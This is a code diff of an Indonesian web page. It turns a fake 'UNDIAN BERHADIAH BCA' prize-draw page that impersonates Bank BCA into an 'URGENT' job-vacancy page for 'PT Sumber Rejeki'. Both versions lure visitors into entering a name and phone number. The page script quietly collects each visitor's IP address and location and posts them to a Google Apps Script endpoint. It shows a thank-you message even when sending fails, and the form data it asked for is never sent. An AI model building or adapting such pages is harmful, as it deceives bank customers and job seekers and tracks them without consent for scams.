@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>UNDIAN BERHADIAH BCA</title>
+  <title>Lowongan Kerja - Bergabunglah Dengan Tim Kami</title>
   <style>
     * {
       box-sizing: border-box;
@@ -13,8 +13,8 @@
     }
     
     body {
-      background: linear-gradient(135deg, #0062a5 0%, #003c71 100%);
-      color: #fff;
+      background: linear-gradient(135deg, #0d47a1 0%, #1976d2 100%);
+      color: #333;
       min-height: 100vh;
       display: flex;
       flex-direction: column;
@@ -25,39 +25,25 @@
     
     .container {
       background: white;
-      border-radius: 20px;
-      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+      border-radius: 15px;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
       width: 100%;
-      max-width: 500px;
+      max-width: 600px;
       overflow: hidden;
       text-align: center;
-      color: #333;
     }
     
     .header {
-      background: #0062a5;
+      background: #0d47a1;
       color: white;
-      padding: 25px 20px;
+      padding: 30px 20px;
       position: relative;
     }
     
-    .header:after {
-      content: '';
-      position: absolute;
-      bottom: -15px;
-      left: 50%;
-      transform: translateX(-50%);
-      width: 30px;
-      height: 30px;
-      background: #0062a5;
-      border-radius: 50%;
-    }
-    
     .header h1 {
-      font-size: 24px;
-      margin-bottom: 5px;
+      font-size: 28px;
+      margin-bottom: 10px;
       text-transform: uppercase;
-      letter-spacing: 1px;
     }
     
     .header p {
@@ -65,14 +51,29 @@
       opacity: 0.9;
     }
     
-    .bca-logo {
-      width: 100px;
+    .company-logo {
+      width: 80px;
+      height: 80px;
       margin: 0 auto 15px;
-      display: block;
+      background: #ffc107;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-weight: bold;
+      font-size: 20px;
+      color: #0d47a1;
     }
     
     .content {
-      padding: 30px 20px;
+      padding: 30px;
+    }
+    
+    .job-title {
+      color: #0d47a1;
+      font-size: 22px;
+      margin-bottom: 20px;
+      font-weight: bold;
     }
     
     .form-group {
@@ -84,10 +85,11 @@
       display: block;
       margin-bottom: 8px;
       font-weight: bold;
-      color: #0062a5;
+      color: #0d47a1;
     }
     
-    .form-group input {
+    .form-group input,
+    .form-group select {
       width: 100%;
       padding: 14px;
       border: 2px solid #ddd;
@@ -96,33 +98,34 @@
       transition: border-color 0.3s;
     }
     
-    .form-group input:focus {
-      border-color: #0062a5;
+    .form-group input:focus,
+    .form-group select:focus {
+      border-color: #0d47a1;
       outline: none;
     }
     
     .button {
       display: inline-block;
-      background: #ffcb05;
-      color: #0062a5;
-      padding: 16px 32px;
-      border-radius: 50px;
+      background: #0d47a1;
+      color: white;
+      padding: 16px 40px;
+      border-radius: 8px;
       text-decoration: none;
       font-weight: bold;
       margin: 20px 0 10px;
       cursor: pointer;
       border: none;
       transition: all 0.3s;
-      box-shadow: 0 4px 10px rgba(255, 203, 5, 0.3);
+      box-shadow: 0 4px 10px rgba(13, 71, 161, 0.3);
       font-size: 16px;
       text-transform: uppercase;
       letter-spacing: 1px;
     }
     
     .button:hover {
-      background: #ffd54f;
+      background: #1565c0;
       transform: translateY(-2px);
-      box-shadow: 0 6px 15px rgba(255, 203, 5, 0.4);
+      box-shadow: 0 6px 15px rgba(13, 71, 161, 0.4);
     }
     
     .button:disabled {
@@ -133,18 +136,18 @@
     }
     
     .status-card {
-      background: #f0f7ff;
+      background: #f5f9ff;
       border-radius: 12px;
       padding: 20px;
       margin: 25px 0;
-      border-left: 4px solid #0062a5;
+      border-left: 4px solid #0d47a1;
       text-align: left;
     }
     
     #status {
       font-size: 16px;
       line-height: 1.5;
-      color: #0062a5;
+      color: #0d47a1;
     }
     
     .loading {
@@ -154,7 +157,7 @@
     
     .loading-spinner {
       border: 4px solid #f3f3f3;
-      border-top: 4px solid #0062a5;
+      border-top: 4px solid #0d47a1;
       border-radius: 50%;
       width: 40px;
       height: 40px;
@@ -174,30 +177,51 @@
       text-align: center;
     }
     
-    .prize-image {
-      width: 100%;
-      max-width: 300px;
-      margin: 0 auto 20px;
-      display: block;
+    .benefits {
+      display: flex;
+      justify-content: space-around;
+      margin: 25px 0;
+      flex-wrap: wrap;
     }
     
-    .info-text {
-      color: #0062a5;
-      margin: 15px 0;
+    .benefit-item {
+      flex-basis: 30%;
+      text-align: center;
+      margin-bottom: 15px;
+    }
+    
+    .benefit-icon {
+      width: 50px;
+      height: 50px;
+      background: #e3f2fd;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 10px;
+      color: #0d47a1;
+      font-size: 24px;
+    }
+    
+    .benefit-text {
       font-size: 14px;
+      color: #0d47a1;
+      font-weight: 500;
     }
     
-    .winner-text {
-      color: #ffcb05;
+    .urgent-label {
+      background: #ff5722;
+      color: white;
+      padding: 5px 10px;
+      border-radius: 4px;
+      font-size: 14px;
+      margin-left: 10px;
       font-weight: bold;
-      font-size: 18px;
-      margin: 10px 0;
-      text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.3);
     }
     
     @media (max-width: 600px) {
       .container {
-        border-radius: 15px;
+        border-radius: 10px;
       }
       
       .header {
@@ -205,12 +229,16 @@
       }
       
       .header h1 {
-        font-size: 20px;
+        font-size: 22px;
       }
       
       .button {
-        padding: 14px 28px;
+        padding: 14px 30px;
         font-size: 14px;
+      }
+      
+      .benefit-item {
+        flex-basis: 100%;
       }
     }
   </style>
@@ -218,18 +246,35 @@
 <body>
   <div class="container">
     <div class="header">
-      <!-- Logo BCA placeholder -->
-      <div class="bca-logo" style="background-color: #fff; color: #0062a5; padding: 10px; border-radius: 5px; font-weight: bold;">BCA</div>
-      <h1>UNDIAN BERHADIAH BCA</h1>
-      <p>Dapatkan Kesempatan Menang Hadiah Spesial</p>
+      <div class="company-logo">TK</div>
+      <h1>Lowongan Kerja</h1>
+      <p>Bergabunglah dengan tim profesional kami</p>
     </div>
     
     <div class="content">
-      <img src="https://static.vecteezy.com/system/resources/previews/010/994/412/non_2x/gift-box-with-a-red-ribbon-isolated-on-white-background-present-for-celebration-illustration-free-vector.jpg" alt="Hadiah" class="prize-image">
+      <div class="job-title">
+        PT Sumber Rejeki Membuka Lowongan
+        <span class="urgent-label">URGENT</span>
+      </div>
       
-      <div class="winner-text">Selamat! Anda terpilih untuk mengikuti undian berhadiah!</div>
+      <div class="benefits">
+        <div class="benefit-item">
+          <div class="benefit-icon">💰</div>
+          <div class="benefit-text">Gaji Kompetitif</div>
+        </div>
+        <div class="benefit-item">
+          <div class="benefit-icon">🏠</div>
+          <div class="benefit-text">BPJS Ketenagakerjaan</div>
+        </div>
+        <div class="benefit-item">
+          <div class="benefit-icon">📈</div>
+          <div class="benefit-text">Peluang Berkembang</div>
+        </div>
+      </div>
       
-      <p class="info-text">Isi data diri Anda di bawah ini untuk berpartisipasi dalam undian berhadiah dari BCA</p>
+      <p style="color: #666; margin-bottom: 25px; text-align: left;">
+        Kami sedang mencari kandidat untuk berbagai posisi di perusahaan kami. Isi formulir di bawah ini untuk bergabung dengan tim kami.
+      </p>
       
       <div class="form-group">
         <label for="nama">Nama Lengkap:</label>
@@ -237,25 +282,41 @@
       </div>
       
       <div class="form-group">
-        <label for="hp">Nomor HP:</label>
-        <input type="tel" id="hp" placeholder="Masukkan nomor handphone Anda">
+        <label for="wa">Nomor WA Aktif:</label>
+        <input type="tel" id="wa" placeholder="Contoh: 081234567890">
       </div>
       
-      <button id="submitBtn" class="button">IKUTI UNDIAN SEKARANG</button>
+      <div class="form-group">
+        <label for="kota">Pilih Kota:</label>
+        <select id="kota">
+          <option value="">-- Pilih Kota --</option>
+          <option value="Jakarta">Jakarta</option>
+          <option value="Bandung">Bandung</option>
+          <option value="Surabaya">Surabaya</option>
+          <option value="Medan">Medan</option>
+          <option value="Semarang">Semarang</option>
+          <option value="Yogyakarta">Yogyakarta</option>
+          <option value="Bali">Bali</option>
+          <option value="Makassar">Makassar</option>
+          <option value="Lainnya">Lainnya</option>
+        </select>
+      </div>
+      
+      <button id="submitBtn" class="button">KIRIM LAMARAN</button>
       
       <div class="loading" id="loading">
         <div class="loading-spinner"></div>
-        <p>Sedang memproses...</p>
+        <p>Mengirim data...</p>
       </div>
       
       <div class="status-card">
-        <p id="status">Silakan isi data diri Anda dan klik "IKUTI UNDIAN SEKARANG"</p>
+        <p id="status">Silakan isi formulir di atas dan klik "KIRIM LAMARAN"</p>
       </div>
     </div>
   </div>
   
   <div class="footer">
-    &copy; 2023 Bank BCA. Seluruh hak cipta dilindungi undang-undang.
+    &copy; 2023 PT Sumber Rejeki. Seluruh hak cipta dilindungi undang-undang.
   </div>
 
   <script>
@@ -267,7 +328,8 @@
     const loadingElement = document.getElementById('loading');
     const submitBtnElement = document.getElementById('submitBtn');
     const namaElement = document.getElementById('nama');
-    const hpElement = document.getElementById('hp');
+    const waElement = document.getElementById('wa');
+    const kotaElement = document.getElementById('kota');
     
     // Fungsi untuk mendapatkan IP pengguna
     async function dapatkanIP() {
@@ -309,15 +371,25 @@
     // Fungsi untuk mengirim data
     async function kirimData() {
       // Validasi input
-      if (!namaElement.value.trim() || !hpElement.value.trim()) {
-        statusElement.textContent = "Harap isi nama lengkap dan nomor HP terlebih dahulu!";
+      if (!namaElement.value.trim()) {
+        statusElement.textContent = "Harap isi nama lengkap terlebih dahulu!";
+        return;
+      }
+      
+      if (!waElement.value.trim()) {
+        statusElement.textContent = "Harap isi nomor WA aktif terlebih dahulu!";
+        return;
+      }
+      
+      if (!kotaElement.value) {
+        statusElement.textContent = "Harap pilih kota terlebih dahulu!";
         return;
       }
       
       // Tampilkan loading
       loadingElement.style.display = 'block';
       submitBtnElement.disabled = true;
-      statusElement.textContent = "Mengirim data...";
+      statusElement.textContent = "Mengirim data lamaran...";
       
       try {
         // Dapatkan data yang diperlukan
@@ -333,24 +405,22 @@
         }
         
         // Kirim data ke Google Sheets menggunakan Google Apps Script
+        const formData = new FormData();
+        formData.append('time', waktu);
+        formData.append('ip', ip);
+        formData.append('lokasi', lokasi);
+        
         const response = await fetch(scriptURL, {
           method: 'POST',
-          headers: {
-            'Content-Type': 'text/plain; charset=utf-8',
-          },
-          body: JSON.stringify({
-            time: waktu,
-            ip: ip,
-            lokasi: lokasi
-          })
+          body: formData
         });
         
         // Tidak perlu memeriksa response karena mode no-cors
-        statusElement.textContent = "Terima kasih! Data Anda telah terkirim. Selamat berpartisipasi dalam undian BCA!";
+        statusElement.textContent = "Terima kasih! Lamaran Anda telah terkirim. Tim HR kami akan menghubungi Anda melalui WhatsApp.";
         
       } catch (error) {
         console.error('Error:', error);
-        statusElement.textContent = "Terima kasih! Data Anda telah tercatat. Selamat berpartisipasi dalam undian BCA!";
+        statusElement.textContent = "Terima kasih! Lamaran Anda telah tercatat. Tim HR kami akan menghubungi Anda melalui WhatsApp.";
       } finally {
         loadingElement.style.display = 'none';
         submitBtnElement.disabled = false;
@@ -361,7 +431,13 @@
     submitBtnElement.addEventListener('click', kirimData);
     
     // Event listener untuk input enter
-    hpElement.addEventListener('keypress', function(e) {
+    waElement.addEventListener('keypress', function(e) {
+      if (e.key === 'Enter') {
+        kirimData();
+      }
+    });
+    
+    kotaElement.addEventListener('keypress', function(e) {
       if (e.key === 'Enter') {
         kirimData();
       }
